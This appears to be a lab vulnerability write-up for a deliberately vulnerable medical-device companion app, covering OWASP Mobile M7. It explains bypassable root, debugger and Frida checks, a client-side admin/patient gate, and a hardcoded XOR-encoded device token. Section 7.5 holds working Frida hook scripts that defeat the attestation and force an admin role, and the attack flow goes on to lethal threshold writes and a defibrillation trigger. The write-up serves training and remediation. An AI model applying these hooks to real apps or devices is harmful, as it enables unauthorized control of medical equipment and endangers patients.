---
id: M7
title: "Insufficient Binary Protection"
category: Mobile
status: DONE
severity: High
owasp: "Mobile M7 - Insufficient Binary Protection"
cwe: "CWE-693 (Protection Mechanism Failure) / CWE-602 (Client-Side Enforcement of Server-Side Security) / CWE-285 (Improper Authorization)"
source_docs:
  - "CareOtter_App.md (app structure: LoginActivity routing, AdminActivity IGP panel)"
  - "Vulns/IoT/IoT1_Weak_Guessable_Hardcoded_Passwords.md (the OtterMobile2026 IGP token the admin panel auto-presents)"
  - "Vulns/IoT/IoT2_Insecure_Network_Services.md (the careservice :9999 IGP surface the admin panel drives)"
affected_components:
  - "vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/SecurityGuard.java - the four present-but-bypassable checks (root, debugger, Frida, signature) behind one hookable isCompromised verdict"
  - "vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/LoginActivity.java - SecurityGuard.enforce() startup gate, and routeByRole(), the sole client-side admin/patient gate, role parsed from the login JSON"
  - "vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/AdminActivity.java - onCreate performs no entry authorization, execProtected auto-authenticates to IGP :9999"
  - "vulnzoo_apps/careotter_app/app/src/main/java/com/vulnzoo/careotter_app/IgpClient.java - decodeToken()/ENCODED_TOKEN, the hardcoded XOR admin token (OtterMobile2026)"
  - "vulnzoo_apps/careotter_app/app/build.gradle.kts - release build with isMinifyEnabled=false (no obfuscation/shrinking)"
  - "vulnzoo_apps/careotter_app/app/src/main/AndroidManifest.xml - AdminActivity android:exported=false (reached in-process via instrumentation)"
verified_date: ""
---

# M7 - Insufficient Binary Protection

> **Status:** DONE
> **OWASP:** Mobile M7 - Insufficient Binary Protection
> **CWE:** CWE-693 / CWE-602 / CWE-285
> **Severity:** High

---

## Why It Matters

The CareOtter patient app ships runtime self-protection that is present but insufficient. At launch it checks for root, an attached debugger, and Frida-style instrumentation, and it computes a signing-certificate hash. The checks make the app look hardened, but each one is trivially defeated: the root check is a fixed list of su paths, the debugger check is a single API call, the Frida check is a substring scan of the process memory map, the signing-certificate result is computed and then ignored, and the release build is not obfuscated. OWASP Mobile M7 is precisely this condition, protections that exist but provide no real resistance to tampering or instrumentation (CWE-693, protection mechanism failure). On a device the attacker controls, the whole attestation collapses to a single hookable Java method.

Weak protection only matters if something inside the trusted process is worth defeating, and here something is. The app's entire separation between the patient role and the administrator role is a single client-side branch in `LoginActivity.routeByRole`. Nothing on the device side re-checks it. The administrator screen performs no authorization on entry, and the privileged operations it exposes authenticate to the medical device with a credential hardcoded into the same APK. So once the attestation is defeated, the authorization boundary between a normal patient and the full device administration panel is one `if` statement running inside a process the attacker owns.

With no binary protection, that branch is removed at runtime. The boundary is in fact cosmetic. Because `AdminActivity` performs no authorization on entry and its privileged operations carry their own hardcoded device token, the panel is reachable cold, with no admin credentials and in principle no login at all. The canonical demonstration keeps it simple and reliable: a patient authenticates with their own low-privilege account, a Frida hook rewrites the role decision, and the app drops them into `AdminActivity` with the full IGP v4 control surface, defibrillation trigger, command injection, format-string leak, and lethal threshold writes against the careservice on TCP `:9999`. The client-side role gate is not a security control once the binary is instrumentable.

The same device administration surface is also reachable directly on `:9999` with the leaked token (see [[IoT1_Weak_Guessable_Hardcoded_Passwords]] and [[IoT2_Insecure_Network_Services]]). That overlap is expected in a lab this size, where one capability has several doors. M7 owns a specific door: the app's own role boundary, defeated by runtime instrumentation because the binary has nothing to stop it.

---

## OWASP Classification

| Category                                       | Role                                                                                                                                                                                                                                                                                                                                                 |
| ---------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **M7 - Insufficient Binary Protection**        | Primary - the app's root, debugger, Frida, and signature checks are present but weak and collapse into one hookable verdict (`isCompromised`), the signature result is not even enforced, and the release build is non-obfuscated, so a client-side security decision can be observed and replaced at runtime (CWE-693 protection mechanism failure) |
| **M3 - Insecure Authentication/Authorization** | Related - the admin/patient split is enforced only client-side (`routeByRole`), and `AdminActivity` performs no entry authorization (CWE-602 client-side enforcement, CWE-285 improper authorization). Operation-auth lens owned by [[M3_Insecure_Authentication_Authorization]]                                                                     |
| **IoT:I1 - Hardcoded Credential**              | Downstream - once in the panel, every privileged action auto-authenticates with the hardcoded `OtterMobile2026` IGP token. Owned by [[IoT1_Weak_Guessable_Hardcoded_Passwords]]                                                                                                                                                                      |
| **IoT:I2 - Insecure Network Services**         | Downstream - the device-admin power the panel drives is the careservice IGP surface on `:9999`. Owned by [[IoT2_Insecure_Network_Services]]                                                                                                                                                                                                          |

**Why M7.** The defect is not that the careservice trusts a static token (that is IoT:I1) or that the IGP channel is cleartext (that is IoT:I2). The defect M7 names is that the app's protection against runtime tampering is insufficient, so the controls it does enforce, the startup attestation and the client-side role routing, are trivially bypassed by instrumenting the running process. Shipping a release binary whose anti-tamper, anti-debug, and instrumentation checks collapse to a single hookable method, with no obfuscation, is exactly OWASP Mobile M7's scope.

---

## 7.1 - The runtime protection is present but insufficient

`SecurityGuard` runs four checks at launch and funnels them into one verdict, which `LoginActivity` enforces before it wires its UI:

```java
// SecurityGuard - four weak checks behind a single hookable verdict
public static boolean isDeviceRooted()     { /* fixed list of su paths only */ }
public static boolean isDebuggerAttached() { return Debug.isDebuggerConnected(); }
public static boolean isFridaPresent()     { /* substring scan of /proc/self/maps */ }
public static boolean isSignatureValid(Context ctx) { /* cert SHA-256 vs a constant */ }

public static boolean isCompromised(Context ctx) {
    boolean sigOk = isSignatureValid(ctx);          // computed...
    Log.w(TAG, "... signatureValid=" + sigOk);      // ...logged...
    return isDeviceRooted() || isDebuggerAttached() || isFridaPresent();  // ...and ignored
}

// LoginActivity.onCreate()
if (SecurityGuard.enforce(this)) return;            // blocking dialog + finishAffinity()
```

> Jadx decompilation to find isFridaPresent() function.
![[m7_jadx_isFridaPresent.png]]

Every check is a plain Java boolean with no native backing, and each carries a known weakness:

- Root: file-existence over a fixed `su` path list. No native check, no Magisk DenyList awareness. Defeated by hiding root or hooking the method.
- Debugger: `Debug.isDebuggerConnected()` only. No `ptrace` self-attach and no native anti-debug.
- Frida: a lowercase substring scan of `/proc/self/maps` for `frida` or `gadget`. Defeated by renaming the gadget, a non-default injection, or hooking the file read.
- Integrity: the signing-certificate SHA-256 is computed and logged, but the result is never folded into the verdict. A detected re-sign is ignored. This is detection without response, an insufficiency in itself.

Because all four collapse into `isCompromised`, one hook on that single method defeats the entire attestation (see 7.5). The release build is also unobfuscated:

![[m7_jadx_isCompromised.png]]

```kotlin
// app/build.gradle.kts
release { isMinifyEnabled = false }   // no shrinking, no obfuscation
```

So the symbol names an attacker targets (`SecurityGuard.isCompromised`, `LoginActivity.routeByRole`, `IgpClient.decodeToken`) appear verbatim in `jadx`, and nothing at runtime meaningfully resists a debugger, root, or an instrumentation toolkit.

---

## 7.2 - The admin/patient boundary is a single client-side branch

After a successful login the app decides which screen to open purely from the `role` string in the login response. `LoginActivity` parses it client-side and routes on it:

```java
// LoginActivity - role parsed from the server's login JSON
String role = json.optString("role", "patient");
// ...persisted to SharedPreferences as user_role, then:
uiHandler.post(() -> routeByRole(role));

// LoginActivity.routeByRole() - the entire admin/patient gate
private void routeByRole(String role) {
    startActivity(new Intent(this, "admin".equals(role)
            ? AdminActivity.class : MainActivity.class));
    finish();
}
```

> 
![[m7_jadx_roleByRole.png]]

This is the whole separation. A patient account gets `role=patient` and is routed to `MainActivity`. The decision is a string comparison evaluated inside the app process. There is no second, server-enforced gate on the path to the admin functionality, because the admin functionality talks to the device directly (see 7.4), not through a role-checked cloud endpoint.

---

## 7.3 - AdminActivity performs no authorization on entry

Reaching `AdminActivity` is sufficient. Its `onCreate` never reads the role, never validates the JWT, and never confirms the user is an administrator. It reads the stored username only to print a cosmetic banner, then wires up every privileged control:

```java
// AdminActivity.onCreate() - no role or token check; username is cosmetic
SharedPreferences prefs = getSharedPreferences("careotter_prefs", MODE_PRIVATE);
String username = prefs.getString("username", "admin");
appendOutput("[SESSION] Logged in as: " + username + " (admin)");
// ... binds btnDefibrillate, btnCmdInjection, btnFormatString,
//     btnUnderflow, btnSetThreshold, WiFi provisioning, etc.
```

`AdminActivity` is declared `android:exported="false"` in the manifest, so it cannot be launched by another app or by `adb am start` from an unprivileged context. The route in is in-process: either the legitimate `routeByRole` branch, or runtime instrumentation that calls it (7.5). Because there is no entry check, instrumentation only has to get the activity to start, the panel does the rest.

---

## 7.4 - The privileged power is gated by a hardcoded token, not by identity

Once the panel is open, each protected action runs through `execProtected`, which authenticates to the careservice on TCP `:9999` by sending the IGP `0x02 AUTHENTICATE` command with a token recovered from `IgpClient.decodeToken()`. That token is hardcoded in the APK and XOR-obfuscated with the single-byte key `0x5A`:

```java
// IgpClient - hardcoded admin token, XOR 0x5A (trivially reversible)
private static final byte[] ENCODED_TOKEN = {
    0x15,0x2E,0x2E,0x3F,0x28,0x17,0x35,0x38,0x33,0x36,0x3F,0x68,0x6A,0x68,0x6C
};
public static String decodeToken() {              // XOR each byte with 0x5A
    // -> "OtterMobile2026"
}
```

Decoding the bytes yields `OtterMobile2026`, the same global IGP credential documented as [[IoT1_Weak_Guessable_Hardcoded_Passwords]]. It is identical on every install and is not tied to the logged-in user, their JWT, or their role. So when an unauthorized user reaches the panel, the auto-authentication step simply succeeds, and the device accepts the privileged IGP commands (lethal `SET_THRESHOLD`, `DEFIBRILLATE`, command injection, format-string, TLV underflow) that drive the careservice surface in [[IoT2_Insecure_Network_Services]]. The cloud role the attacker actually holds never enters the device-side decision.

---

## 7.5 - Discovery and the runtime bypass

Because the binary is unobfuscated and unprotected, the entire chain is recoverable offline and then defeated at runtime.

Find the gate with `jadx` (decompile once, then grep the decompiled sources):

```sh
jadx -d "$(pwd)/out" "$(pwd)/careotter_app.apk"          # CLI; or open in jadx-gui

# 1. The runtime attestation - the protection to defeat first
grep -rn "isCompromised\|isFridaPresent\|isDeviceRooted\|SecurityGuard" out/sources/
#   SecurityGuard.java:  return isDeviceRooted() || isDebuggerAttached() || isFridaPresent();

# 2. The client-side role gate - the whole admin/patient boundary
grep -rn "routeByRole\|AdminActivity\|optString(\"role" out/sources/
#   LoginActivity.java:  startActivity(new Intent(this, "admin".equals(role) ? AdminActivity.class : MainActivity.class));

# 3. The hardcoded IGP admin token reused by the panel
grep -rn "ENCODED_TOKEN\|decodeToken\|0x5A" out/sources/
#   IgpClient.java:  ENCODED_TOKEN = { ... };  // XOR 0x5A -> "OtterMobile2026"

# 4. Confirm the admin screen is non-exported (reached in-process, not via am start)
grep -n "AdminActivity\|exported" out/resources/AndroidManifest.xml
#   <activity android:name=".AdminActivity" android:exported="false"/>
```

The attestation collapses to one verdict in `jadx`. `isCompromised` returns `root || debugger || frida`, and the Frida check is a bare `/proc/self/maps` substring scan:

![[m7_jadx_isCompromised.png]]

![[m7_jadx_isFridaPresent.png]]

The client-side role gate decompiles just as plainly, the `"admin".equals(role)` branch selecting `AdminActivity`:

![[m7_jadx_routeByRole.png]]

Defeat it with Frida. The attestation from 7.1 is bypassable, so the script neutralises it first, then rewrites the role decision so any authenticated patient is routed to the admin panel. Spawn the app (`frida -f`) so the hooks are in place before `LoginActivity.onCreate` runs the check:

```javascript
// m7_frida_poc.js
// Spawn so the hooks land before LoginActivity.onCreate runs the attestation:
//   frida -U -f com.vulnzoo.careotter_app -l m7_frida_poc.js
Java.perform(function () {

    // 1. Defeat the binary protection. The four checks (root, debugger, Frida,
    // signature) collapse into one verdict, so a single hook neutralises them.
    var Guard = Java.use("com.vulnzoo.careotter_app.SecurityGuard");
    Guard.isCompromised.implementation = function (ctx) {
        console.log("[M7] SecurityGuard.isCompromised -> false (attestation defeated)");
        return false;
    };

    // 2. Defeat the client-side authorization. routeByRole is the entire
    // admin/patient gate. this.routeByRole("admin") invokes the original method
    // with the forced role, launching AdminActivity instead of MainActivity.
    var Login = Java.use("com.vulnzoo.careotter_app.LoginActivity");
    Login.routeByRole.implementation = function (role) {
        console.log("[M7] routeByRole('" + role + "') -> forcing 'admin'");
        return this.routeByRole("admin");
    };
});
```

An alternative hook rewrites the role at its source so the whole app, including the persisted `user_role` preference, believes the session is an admin:

```javascript
// Variant: tamper the parsed role string so user_role=admin is also stored.
var JSONObject = Java.use("org.json.JSONObject");
JSONObject.optString.overload('java.lang.String', 'java.lang.String')
    .implementation = function (key, def) {
        var v = this.optString(key, def);
        if (key === "role") { console.log("[M7] role '" + v + "' -> 'admin'"); return "admin"; }
        return v;
    };
```

Either way, the attacker logs in with a normal patient account and lands in `AdminActivity`. Because the panel does no entry check (7.3) and auto-authenticates with the hardcoded token (7.4), the IGP control surface is immediately operable.

---

## Attack flow

1. **Recover the chain.** Decompile the unobfuscated APK with `jadx`. Find `routeByRole` and `AdminActivity` in `LoginActivity`, the `ENCODED_TOKEN` / `decodeToken` admin token in `IgpClient`, and confirm `AdminActivity` is `exported=false` in the manifest.
2. **Prepare the device.** Use a rooted device or emulator running `frida-server`. The app's root, debugger, and Frida checks are present but bypassable.
3. **Defeat the protection and the gate.** Spawn the app under Frida with `m7_frida_poc.js` (`frida -f`). The script hooks `SecurityGuard.isCompromised` to return false before the attestation runs, then hooks `routeByRole`.
4. **Authenticate as a patient.** Log in with an ordinary low-privilege account on the same LAN as the CareOtter device. The hook forces the admin branch and `AdminActivity` opens.
5. **Operate the device.** In the panel, authenticate (auto-sends `OtterMobile2026`) and drive the IGP surface on `:9999`: set lethal thresholds, trigger DEFIBRILLATE, run command injection, or leak memory via the format-string command.
6. **Note the overlap.** The same `:9999` surface is reachable directly with the leaked token and LAN access. M7 demonstrates the app-side door: a non-admin escalates to device admin purely by instrumenting an unprotected binary. See [[IoT1_Weak_Guessable_Hardcoded_Passwords]] and [[IoT2_Insecure_Network_Services]].

---

## Verification Checklist

- [ ] `SecurityGuard` implements root (su paths), debugger (`isDebuggerConnected`), Frida (`/proc/self/maps` scan), and signing-certificate checks, all funnelled through `isCompromised`, with the signature result computed but not enforced.
- [ ] `LoginActivity.onCreate` calls `SecurityGuard.enforce(this)` as the only attestation point, so one hook on `isCompromised` covers the app.
- [ ] `app/build.gradle.kts` release block has `isMinifyEnabled = false` (release APK ships unobfuscated symbol names).
- [ ] `LoginActivity.routeByRole` selects `AdminActivity` vs `MainActivity` solely on the `role` string parsed client-side from the login JSON.
- [ ] `AdminActivity.onCreate` performs no role or JWT check (only reads `username` for display), and `AdminActivity` is `android:exported="false"`.
- [ ] `IgpClient.decodeToken()` returns `OtterMobile2026` (XOR `0x5A` over `ENCODED_TOKEN`), and `execProtected` presents it to `:9999` independent of the user's role.
- [ ] Dynamic: with `frida-server` running, `m7_frida_poc.js` neutralises the attestation (`isCompromised -> false`) and a patient login lands in `AdminActivity`. Confirm a privileged IGP command (e.g. GET_NETWORK or SET_THRESHOLD) succeeds against the device.

```sh
# Dynamic observation - confirm the hook fires and routes to admin
frida -U -f com.vulnzoo.careotter_app -l m7_frida_poc.js
# expect on login: "[M7] routeByRole('patient') -> forcing 'admin'"
```

---

## Remediation

For reference only - do not apply in the lab.

- Make the existing runtime protection sufficient instead of cosmetic. Back the checks with native code, combine multiple independent signals, detect instrumentation more robustly than one `/proc/self/maps` substring, and actually enforce the signing-certificate result instead of logging it. A single hookable Java verdict (`isCompromised`) is defeated by one hook. Use hardened device attestation (Play Integrity) and treat a positive result as a hard stop.
- Enable code shrinking and obfuscation for release builds (`isMinifyEnabled = true` with ProGuard/R8) so symbol names and control flow are not handed to an attacker verbatim. Obfuscation raises the cost of analysis, it is not a substitute for the controls below.
- Never enforce an authorization boundary on the client. The admin/patient decision must be enforced server-side on every privileged request, not by a client-side `routeByRole` branch (CWE-602).
- Authorize the privileged screen and every privileged operation against the authenticated user's verified role, not by mere arrival at the activity (CWE-285).
- Replace the global hardcoded `OtterMobile2026` token with per-device, rotatable credentials and an authenticated, encrypted device channel (owned by [[IoT1_Weak_Guessable_Hardcoded_Passwords]] and [[IoT2_Insecure_Network_Services]]).
